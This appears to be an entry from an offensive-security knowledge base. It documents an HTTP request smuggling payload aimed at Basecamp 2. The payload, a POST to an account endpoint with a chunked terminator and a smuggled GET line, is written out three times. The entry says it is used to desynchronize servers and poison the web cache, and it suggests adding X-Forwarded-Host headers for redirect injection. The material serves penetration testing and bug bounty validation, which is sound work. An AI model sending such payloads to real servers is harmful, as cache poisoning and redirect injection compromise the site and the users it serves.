---
data: |-
  POST /4618984/account HTTP/1.1

  _method=patch&account%5Bname%5D=BC
  0

  GET /x HTTP/1.1
tags:
  - http-smuggling
type: command
executor: bash
platforms:
  - Web
id: 190a1597-baf7-4acc-a894-9e112b9cdb03
created_at: '2025-12-13T09:01:21.875Z'
updated_at: '2025-12-13T09:01:21.875Z'
verified: false
validated: true
submitted: true
---
# Crafted HTTP Smuggling Request

## Command

```bash
POST /4618984/account HTTP/1.1

_method=patch&account%5Bname%5D=BC
0

GET /x HTTP/1.1
```

## Description

This command sends a crafted HTTP request smuggling a GET request inside a POST to desynchronize servers and poison the web cache in Basecamp 2, typically used via Burp Suite for exploitation validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `_method` | Specifies the HTTP method override to PATCH | Yes |
| `account%5Bname%5D` | Sets the account name parameter to BC | Yes |

## Examples

### Basic Usage

```bash
POST /4618984/account HTTP/1.1

_method=patch&account%5Bname%5D=BC
0

GET /x HTTP/1.1
```

### Advanced Usage

Add headers like X-Forwarded-Host for redirect injection in Burp Repeater.

## Expected Output

Captured smuggled request in RequestBin, demonstrating server desync and cache poisoning.

## Related

- [[procedures/Exploit-HTTP-Request-Smuggling-to-Poison-Web-Cache]]
- [[tools/Burp-Suite]]
